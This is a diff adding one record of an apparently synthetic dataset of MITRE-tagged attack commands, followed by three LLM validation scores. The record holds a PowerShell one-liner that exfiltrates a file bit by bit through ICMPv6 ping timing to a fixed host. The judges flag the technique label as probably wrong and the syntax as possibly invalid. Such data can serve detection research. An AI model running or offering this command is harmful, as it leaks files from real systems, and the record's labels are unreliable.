@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
+  "explanation": "Uses a timing covert channel over ICMPv6: uniform payload echos are spaced with distinct delays to represent bit values, aligning with T1011.",
+  "rationale_steps": [
+    "Convert bytes to bit strings.",
+    "Send a constant-size ICMPv6 echo per bit.",
+    "Delay intervals encode 0/1 so a receiver can reconstruct data by observing arrival timing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-1ebf45c5",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, valid cmdlet usage, and correct conditional syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command implements a timing-based covert channel over ICMPv6 to exfiltrate data by encoding bits as timing delays between ping packets, though it relates more to T1048 (Exfiltration Over Alternative Protocol) than T1011 (Dynamic Resolution).",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:15:49.259261Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell command is perfectly well-formed with correct variable assignments, method calls, loops, cmdlet usage, and balanced syntax elements.",
+        "semantic_score": 1,
+        "semantic_justification": "The command implements a timing covert channel over ICMPv6 for data exfiltration, which is misaligned with T1011 'Dynamic Resolution', a technique focused on algorithmic determination of C2 network endpoints.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:15:56.801413Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Overall structure is sound, but the direct use of an if statement inside parentheses for -Milliseconds is not a valid PowerShell expression and is likely to cause a parse error.",
+        "semantic_score": 2,
+        "semantic_justification": "It plausibly implements a timing-based ICMPv6 covert channel, but performs no dynamic endpoint resolution (no DGA/fast-flux/dynamic DNS), so it is misaligned with the described Dynamic Resolution technique.",
+        "combined_score": 2.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-02T07:16:53.758916Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
